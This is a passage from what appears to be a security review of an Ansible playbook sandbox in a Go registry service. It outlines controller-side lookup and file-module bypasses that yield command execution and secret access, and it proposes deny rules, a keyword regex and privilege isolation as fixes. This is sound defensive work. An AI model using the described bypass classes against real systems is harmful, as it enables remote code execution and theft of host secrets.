`lookup`/`q`, wrapped in parens, `{% set %}`-aliased, or replaced entirely by a
`with_<lookup>` loop keyword. A deny of `lookup(` alone is therefore insufficient.

**Root cause:** the playbook runs on the controller, and Ansible's own template
engine and action plugins are, by design, controller-side. A keyword/value
blacklist cannot enumerate every lookup plugin, every `with_*` loop, or
controller-FS modules (`fetch`, `copy`/`template`/`assemble`/`unarchive` with a
controller-side `src`). This is the same impact as CRITICAL-1: RCE on the registry
host (registry SSH keys, `registry.toml`, Beget master key, `control.db`), plus
controller file read/write.

### Minimal validated fix (probed in a throwaway copy; 28/28 reject, 7/7 accept)

Two layers; **the blacklist is mitigation, isolation is the real control.**

**A. Sandbox hardening (`registry/internal/ansible/sandbox.go`) — closes every #1–#17 above:**
1. Reject any mapping **key** with prefix `with_` (the `with_<lookup>` loop family
   invokes the named lookup plugin on the controller).
2. Reject any **templated scalar value** (contains `{{` or `{%`) that mentions the
   bare words `lookup`, `query`, or `q` — regex `(?i)\b(lookup|query|q)\b`. (Value
   scan; the `{{`/`{%` guard keeps false positives to templates that use a
   variable literally named `q`/`query`/`lookup`.)
3. Normalize FQCN prefixes (`ansible.builtin.`, `ansible.legacy.`,
   `community.general.`, `ansible.`) before the loader blacklist match, and add
   `vars_files`, `import_role`, `include` to that list.
4. Add controller-FS modules to the blacklist, or reject `src`/`dest`/`content`
   values pointing at the controller (`fetch`, `copy`, `template`, `assemble`,
   `unarchive`) — otherwise #15/#16 remain.

Validated with the copied source: all 28 forbidden inputs (rounds 1–4, incl. #1–#17)
→ REJECTED; the **default `sharedd-node` profile** (uses `loop:` with a literal
list and `{{ x | default('…') }}` / `{{ x | int }}`) and the legitimate accepts
(`{{ testvar }}`, `connection: ssh`, templated values) → ACCEPTED.

**B. Isolation (recommended, robust):** run `ansible-playbook` as a dedicated
unprivileged uid with **no** access to registry secrets/state/DB (systemd
`User=`/`Group=` + `ProtectSystem=strict`, or `setuid/setgid` in `defaultExec`
before `exec`). Because Ansible action plugins are inherently controller-side,
only a privilege boundary makes arbitrary user playbooks safe; the blacklist in (A)
will rot as Ansible adds lookups/loops.

### Verdict — **NO-GO for production**

The round-3 fix (backstop + templated-**key** rejection) is correct and **verified**
for the connection variable and the `set_fact`-key class. But a **new CRITICAL class
survives**: controller-side lookups (`lookup`/`q`/`query`, incl. `with_<lookup>`
loops) give arbitrary command execution on the registry host as the registry user,
and controller-FS modules give read/write of controller files — all accepted by the
current sandbox and unaffected by `--limit`/`--connection=ssh`/`-e
ansible_connection=ssh`. Do not deploy until (A) at minimum is implemented and
re-reviewed, with (B) strongly preferred.

**Exact pre-deploy checks (after the fix):**
1. `cd registry && go vet ./... && go test -race -count=1 ./... && go build -mod=readonly ./... && golangci-lint run ./...` (AGENTS.md).
2. Extend `TestValidatePlaybookStructuralCounterexamples` (must REJECT): #1 (lookup
   pipe), #4/#5 (`q`/`(q)`), #6/#7 (`{% set %}` alias), #8 (`loop` lookup), #9/#10
   (`with_lines`/`with_pipe`), #11–#14 (file/env/template/fileglob lookups), #15/#16
   (`fetch`/`copy:src=`), #17 (loader FQCN + `vars_files`/`import_role`/`include`).
   Keep the default `sharedd-node` profile and the existing accepts green.
3. E2E guard (reachable sshd): run #1 and #9 through `Runner.Run` with the exact
   flags and assert **no** controller-side marker.
4. `runner_test.go`: keep asserting exactly two `-e`, last == `ansible_connection=ssh`
   and positioned **after** the user JSON (ordering regression).
5. If (B) is adopted: assert the child process runs as the restricted uid and cannot
   read `registry.toml`/`control.db`/keys.
